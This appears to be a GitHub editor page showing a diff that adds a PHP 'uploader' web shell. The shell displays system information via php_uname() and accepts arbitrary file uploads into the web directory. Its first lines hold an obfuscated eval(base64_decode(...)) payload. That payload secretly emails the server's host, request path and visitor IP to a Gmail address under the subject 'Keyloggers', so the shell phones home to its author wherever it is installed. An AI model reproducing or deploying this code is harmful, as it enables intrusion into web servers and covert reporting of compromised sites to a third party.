@@ -1,38 +1,136 @@
+Skip to content
+Search or jump to…
 
+Pull requests
+Issues
+Marketplace
+Explore
+ 
+@firasdris54487 
+firasdris54487
+/
+Firasdris
+0
+0
+0
+Code
+Issues
+Pull requests
+Actions
+Projects
+Wiki
+Security
+Insights
+Settings
+Firasdris
+/
+FirasDris.PhP.txt
+in
+master
+ 
+
+Tabs
+
+8
+
+Soft wrap
+1
+​
+2
 <?php
+3
 eval(base64_decode('PD9waHAKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIuKcqiBLZXlsb2dnZXJzIC0kaXAiOwokZW1haWwgPSAidXNlcjU0NDg3MjE1QGdtYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IEZpcmFzIERyaXMgQm90IFYwLjkgPG5vcmVwbHlARmlyYXNEcmlzVjlzaGVsbHMuY29tPiI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOwo/Pg=='));
+4
 ?>
+5
 <html>
-
+6
+​
+7
     <head>
+8
         <title>Uploader By Firas Dris</title>
-	</head>
+9
+        </head>
+10
 <body>
+11
 <br>
+12
 <br>
+13
 <br>
+14
 <br>
+15
 <br>
+16
 <br>
+17
 <br><br>
+18
 <body onload="window.focus();init();" onunload="halt();">
+19
 <body onLoad="writetext()" style="background:black;">
-	<embed src="https://www.youtube.com/v/cWFr5Qhsx8Y&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
-	<table heigh="" width="800" border="20" align="center">
+20
+        <embed src="https://www.youtube.com/v/cWFr5Qhsx8Y&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
+21
+        <table heigh="" width="800" border="20" align="center">
+22
     <tbody><tr>
+23
     <td valign="top" background=""><p id="MiSi" style="margin-left: 3px;">
+24
 <?php
+25
 $om= "Firasdris";
+26
 $ar= "BotV0.9";
+27
 $atx = $om.$ar;
+28
 echo $atx;
+29
 echo "<font color='RED'</font><center><h1>$atx</h1></center>";
+30
 echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
+31
 echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
+32
 echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
+33
 if( $_POST['_upl'] == "Upload" ) { 
+34
     if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
+35
     else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
+36
 } 
+37
 ?>
+38
 </html>
+39
+​
+@firasdris54487
+Commit changes
+Commit summary
+Create FirasDris.PhP.txt
+Optional extended description
+Add an optional extended description…
+ Commit directly to the master branch.
+ Create a new branch for this commit and start a pull request. Learn more about pull requests.
+ 
+© 2021 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
+{"mode":"full","isActive":false}
